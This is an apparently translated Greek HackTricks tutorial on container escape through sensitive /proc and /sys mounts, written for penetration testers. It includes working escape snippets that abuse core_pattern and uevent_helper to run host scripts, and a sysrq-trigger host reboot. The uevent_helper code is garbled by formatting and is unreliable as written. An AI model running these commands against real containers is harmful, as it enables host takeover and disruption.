# Ευαίσθητοι Σημειακοί Σύνδεσμοι

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Η έκθεση του `/proc` και του `/sys` χωρίς κατάλληλη απομόνωση namespace εισάγει σημαντικούς κινδύνους ασφαλείας, συμπεριλαμβανομένης της αύξησης της επιφάνειας επίθεσης και της αποκάλυψης πληροφοριών. Αυτοί οι κατάλογοι περιέχουν ευαίσθητα αρχεία που, αν είναι κακώς ρυθμισμένα ή προσπελάζονται από μη εξουσιοδοτημένο χρήστη, μπορούν να οδηγήσουν σε διαφυγή κοντέινερ, τροποποίηση του host ή να παρέχουν πληροφορίες που διευκολύνουν περαιτέρω επιθέσεις. Για παράδειγμα, η λανθασμένη τοποθέτηση `-v /proc:/host/proc` μπορεί να παρακάμψει την προστασία AppArmor λόγω της φύσης της βασισμένης σε διαδρομές, αφήνοντας το `/host/proc` απροστάτευτο.

**Μπορείτε να βρείτε περισσότερες λεπτομέρειες για κάθε πιθανή ευπάθεια στο** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Ευπάθειες procfs

### `/proc/sys`

Αυτός ο κατάλογος επιτρέπει την πρόσβαση για την τροποποίηση μεταβλητών του πυρήνα, συνήθως μέσω `sysctl(2)`, και περιέχει αρκετούς υποκαταλόγους ανησυχίας:

#### **`/proc/sys/kernel/core_pattern`**

* Περιγράφεται στο [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Επιτρέπει τον καθορισμό ενός προγράμματος που θα εκτελείται κατά την παραγωγή core-file με τα πρώτα 128 bytes ως παραμέτρους. Αυτό μπορεί να οδηγήσει σε εκτέλεση κώδικα αν το αρχείο αρχίζει με μια σωλήνα `|`.
*   **Παράδειγμα Δοκιμής και Εκμετάλλευσης**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Δοκιμή πρόσβασης εγγραφής
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Ορισμός προσαρμοσμένου χειριστή
sleep 5 && ./crash & # Ενεργοποίηση χειριστή
```

#### **`/proc/sys/kernel/modprobe`**

* Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Περιέχει τη διαδρομή προς τον φορτωτή μονάδων του πυρήνα, που καλείται για τη φόρτωση μονάδων πυρήνα.
*   **Παράδειγμα Ελέγχου Πρόσβασης**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Έλεγχος πρόσβασης στο modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Αναφέρεται στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Ένας παγκόσμιος σημαία που ελέγχει αν ο πυρήνας πανικοβάλλεται ή καλεί τον OOM killer όταν συμβαίνει μια κατάσταση OOM.

#### **`/proc/sys/fs`**

* Σύμφωνα με [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), περιέχει επιλογές και πληροφορίες σχετικά με το σύστημα αρχείων.
* Η πρόσβαση εγγραφής μπορεί να επιτρέψει διάφορες επιθέσεις άρνησης υπηρεσίας κατά του host.

#### **`/proc/sys/fs/binfmt_misc`**

* Επιτρέπει την καταχώριση διερμηνέων για μη εγγενείς δυαδικές μορφές με βάση τον μαγικό τους αριθμό.
* Μπορεί να οδηγήσει σε εκμετάλλευση δικαιωμάτων ή πρόσβαση σε root shell αν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο.
* Σχετική εκμετάλλευση και εξήγηση:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Σε βάθος tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Άλλες στο `/proc`

#### **`/proc/config.gz`**

* Μπορεί να αποκαλύψει τη διαμόρφωση του πυρήνα αν είναι ενεργοποιημένο το `CONFIG_IKCONFIG_PROC`.
* Χρήσιμο για επιτιθέμενους για να εντοπίσουν ευπάθειες στον τρέχοντα πυρήνα.

#### **`/proc/sysrq-trigger`**

* Επιτρέπει την εκτέλεση εντολών Sysrq, προκαλώντας ενδεχομένως άμεσες επανεκκινήσεις του συστήματος ή άλλες κρίσιμες ενέργειες.
*   **Παράδειγμα Επανεκκίνησης Host**:

```bash
echo b > /proc/sysrq-trigger # Επανεκκινεί τον host
```

#### **`/proc/kmsg`**

* Εκθέτει μηνύματα του δακτυλίου του πυρήνα.
* Μπορεί να βοηθήσει σε εκμεταλλεύσεις πυρήνα, διαρροές διευθύνσεων και να παρέχει ευαίσθητες πληροφορίες συστήματος.

#### **`/proc/kallsyms`**

* Λίστα συμβόλων που εξάγονται από τον πυρήνα και τις διευθύνσεις τους.
* Απαραίτητο για την ανάπτυξη εκμεταλλεύσεων πυρήνα, ειδικά για την υπέρβαση του KASLR.
* Οι πληροφορίες διευθύνσεων περιορίζονται με το `kptr_restrict` ρυθμισμένο σε `1` ή `2`.
* Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Διασύνδεση με τη συσκευή μνήμης του πυρήνα `/dev/mem`.
* Ιστορικά ευάλωτο σε επιθέσεις εκμετάλλευσης δικαιωμάτων.
* Περισσότερα στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Αντιπροσωπεύει τη φυσική μνήμη του συστήματος σε μορφή ELF core.
* Η ανάγνωση μπορεί να διαρρεύσει περιεχόμενα μνήμης του host και άλλων κοντέινερ.
* Το μεγάλο μέγεθος αρχείου μπορεί να οδηγήσει σε προβλήματα ανάγνωσης ή κρασάρισμα λογισμικού.
* Λεπτομερής χρήση στο [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Εναλλακτική διασύνδεση για το `/dev/kmem`, που αντιπροσωπεύει την εικονική μνήμη του πυρήνα.
* Επιτρέπει την ανάγνωση και εγγραφή, επομένως άμεση τροποποίηση της μνήμης του πυρήνα.

#### **`/proc/mem`**

* Εναλλακτική διασύνδεση για το `/dev/mem`, που αντιπροσωπεύει τη φυσική μνήμη.
* Επιτρέπει την ανάγνωση και εγγραφή, η τροποποίηση όλης της μνήμης απαιτεί την επίλυση εικονικών σε φυσικές διευθύνσεις.

#### **`/proc/sched_debug`**

* Επιστρέφει πληροφορίες προγραμματισμού διεργασιών, παρακάμπτοντας τις προστασίες του PID namespace.
* Εκθέτει ονόματα διεργασιών, IDs και αναγνωριστικά cgroup.

#### **`/proc/[pid]/mountinfo`**

* Παρέχει πληροφορίες σχετικά με τα σημεία σύνδεσης στο namespace σύνδεσης της διεργασίας.
* Εκθέτει τη θέση του `rootfs` ή της εικόνας του κοντέινερ.

### Ευπάθειες `/sys`

#### **`/sys/kernel/uevent_helper`**

* Χρησιμοποιείται για την επεξεργασία `uevents` συσκευών πυρήνα.
* Η εγγραφή στο `/sys/kernel/uevent_helper` μπορεί να εκτελέσει αυθαίρετα σενάρια κατά την ενεργοποίηση `uevent`.
*   **Παράδειγμα Εκμετάλλευσης**: %%%bash

#### Δημιουργεί ένα payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Βρίσκει τη διαδρομή του host από το OverlayFS mount για το κοντέινερ

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Ορίζει το uevent\_helper σε κακόβουλο helper

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Ενεργοποιεί ένα uevent

echo change > /sys/class/mem/null/uevent

#### Διαβάζει την έξοδο

cat /output %%%

#### **`/sys/class/thermal`**

* Ελέγχει τις ρυθμίσεις θερμοκρασίας, ενδεχομένως προκαλώντας επιθέσεις DoS ή φυσική ζημιά.

#### **`/sys/kernel/vmcoreinfo`**

* Διαρρέει διευθύνσεις πυρήνα, ενδεχομένως υπονομεύοντας το KASLR.

#### **`/sys/kernel/security`**

* Στεγάζει τη διεπαφή `securityfs`, επιτρέποντας τη ρύθμιση των Linux Security Modules όπως το AppArmor.
* Η πρόσβαση μπορεί να επιτρέψει σε ένα κοντέινερ να απενεργοποιήσει το MAC σύστημα του.

#### **`/sys/firmware/efi/vars` και `/sys/firmware/efi/efivars`**

* Εκθέτει διεπαφές για την αλληλεπίδραση με τις μεταβλητές EFI στην NVRAM.
* Η κακή ρύθμιση ή η εκμετάλλευση μπορεί να οδηγήσει σε κατεστραμμένα laptops ή μηχανές host που δεν εκκινούν.

#### **`/sys/kernel/debug`**

* Το `debugfs` προσφέρει μια διεπαφή αποσφαλμάτωσης "χωρίς κανόνες" στον πυρήνα.
* Ιστορικό προβλημάτων ασφαλείας λόγω της απεριόριστης φύσης του.

### Αναφορές

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Κατανόηση και Σκληραγώγηση των Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Κατάχρηση Προνομιακών και Μη Προνομιακών Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
